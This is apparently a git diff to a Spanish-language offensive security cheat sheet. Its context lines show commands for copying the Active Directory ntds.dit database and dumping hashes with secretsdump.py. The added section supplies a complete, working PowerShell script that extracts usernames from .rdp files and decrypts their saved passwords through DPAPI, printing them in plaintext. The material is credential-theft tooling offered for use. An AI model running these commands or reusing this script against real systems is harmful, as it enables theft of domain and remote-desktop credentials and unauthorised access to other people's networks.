@@ -104,3 +104,84 @@ robocopy /b x:\Windows\NTDS\ . ntds.dit
 ```bash
 secretsdump.py -system system.save -ntds ntds.dit LOCAL
 ```
+
+
+## RDP SCAR DATA
+
+- Crear el ps1 y ejecutar
+```bash
+decrypt.ps1 archivo.rdp
+```
+
+```bash
+<#
+    .SYNOPSIS
+        A PowerShell script to decrypt passwords from rdp files
+    .DESCRIPTION
+        A PowerShell script to decrypt passwords from rdp files
+    .PARAMETER rdpfile
+        rdp file
+#>
+[CmdletBinding()]
+Param(
+  [Parameter(Mandatory=$true,Position=1)][alias("f")][string]$rdpfile=""
+)
+
+if(-not (Test-Path $rdpfile))
+{
+    write-warning ("File {0} not found!" -f $rdpfile)
+    exit 2
+}
+
+[string]$sUserName=$null
+[string]$sDomain=$null
+[string]$sEncryptedPass=$null
+[string]$sPass=$null
+
+# Read RDP File
+$sFileContent=Get-Content $rdpfile
+foreach($sLine in $sFileContent)
+{
+    if($sLine.StartsWith("username:s:"))
+    {
+        $sUserName=$sLine.Replace("username:s:","")
+    }
+    elseif($sLine.StartsWith("domain:s:"))
+    {
+        $sDomain=$sLine.Replace("domain:s:","")
+    }
+    elseif($sLine.StartsWith("password 51:b:"))
+    {
+        $sEncryptedPass=$sLine.Replace("password 51:b:","")
+    }
+}
+# Check Input
+if(!$sUserName)
+{
+    write-warning "No username found!"
+    exit 2
+}
+if(!$sEncryptedPass)
+{
+    write-warning "No encrypted password found!"
+    exit 2
+}
+if($sUserName.IndexOf("\") -lt 0 -and  $sDomain)
+{
+    $sUserName="{0}\{1}" -f $sDomain,$sUserName
+}
+
+
+[System.reflection.assembly]::LoadWithPartialName("System.Security") | out-null
+
+$iBytes=$sEncryptedPass.Length/2
+[byte[]]$aEncryptedPasswordBytes = New-Object -TypeName byte[] $iBytes
+for ($i = 0; $i -lt $iBytes; $i++) {
+    $aEncryptedPasswordBytes[$i] = [System.Convert]::ToByte($sEncryptedPass.Substring($i*2,2), 16)
+}
+[byte[]]$passwordAsBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($aEncryptedPasswordBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+$sPass=[System.Text.Encoding]::Unicode.GetString($passwordAsBytes)
+
+write-host ("{0,-16} : {1}" -f "UserName",$sUserName)
+write-host ("{0,-16} : {1}" -f "Password",$sPass)
+```
